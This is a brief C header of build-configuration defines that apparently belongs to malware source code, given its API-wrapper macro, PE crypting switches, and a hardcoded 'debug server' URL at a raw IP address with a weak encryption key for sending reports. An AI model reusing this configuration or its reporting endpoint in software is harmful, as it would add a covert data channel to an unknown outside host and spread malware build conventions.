#pragma once

#define CWA(dll, api)                 ::api
#define MEM_PERSONAL_HEAP             1
#define MEM_ALLOC_SAFE_BYTES          1
#define XLIB_UCL_ONLY_MAX_COMPRESSION 1
#define XLIB_UCL_ENABLE_NRV2B         1
#define XLIB_UCL_ENABLE_NRV2D         0
#define XLIB_UCL_ENABLE_NRV2E         0
#define XLIB_DEBUG_SERVER_URL         "http://195.2.252.140/dserver/report.php"
#define XLIB_DEBUG_SERVER_CRYPTKEY    "hello"
#define PEIMAGE_32                    1
#define PEIMAGE_64                    0
#define XLIB_PECRYPT_LITE             0
#define XLIB_MSCAB_FCI                1
#define XLIB_MSCAB_FDI                0
#define NTDLL_IMPORT                  0
#define FS_ALLOW_FILEMAPPING          0

#include "..\common\config.h"
#include "..\common\defines.h"
